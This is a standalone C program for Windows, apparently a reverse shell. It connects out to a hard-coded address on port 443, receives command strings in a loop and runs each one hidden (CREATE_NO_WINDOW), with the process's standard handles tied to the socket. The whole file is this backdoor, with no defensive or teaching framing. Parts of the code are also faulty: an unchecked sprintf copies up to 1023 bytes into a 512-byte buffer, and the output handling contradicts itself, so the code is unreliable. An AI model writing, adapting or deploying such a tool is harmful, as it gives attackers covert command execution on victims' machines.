#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define SERVER_ADDR "192.168.0.1"
#define SERVER_PORT 443
#define BUFFER_SIZE 1024


int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    char buffer[BUFFER_SIZE];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Failed to initialize winsock");
        return EXIT_FAILURE;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        perror("Failed to create socket");
        WSACleanup();
        return EXIT_FAILURE;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);
    serverAddr.sin_port = htons(SERVER_PORT);

    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("Failed to connect to the server");
        closesocket(sock);
        WSACleanup();
        return EXIT_FAILURE;
    }

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        // Receive command from the server
        int bytesRead = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytesRead == 0) {
            printf("Connection closed by the client\n");
            break;
        } else if (bytesRead == SOCKET_ERROR) {
            perror("recv failed");
            break;
        }
        
        // Execute the received command
        FILE *fp;
        STARTUPINFO startupInfo;
        PROCESS_INFORMATION processInformation;

        memset(&startupInfo, 0, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags = STARTF_USESTDHANDLES;
        startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)sock;

        char fullCmd[512];
        sprintf(fullCmd, "%s > %s 2>&1", buffer, "output.txt");

        if (CreateProcess(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation)) {
            WaitForSingleObject(processInformation.hProcess, INFINITE);
            CloseHandle(processInformation.hThread);
            CloseHandle(processInformation.hProcess);
        } else {
            perror("CreateProcess failed");
        }
    }

    closesocket(sock);
    WSACleanup();

    return EXIT_SUCCESS;
}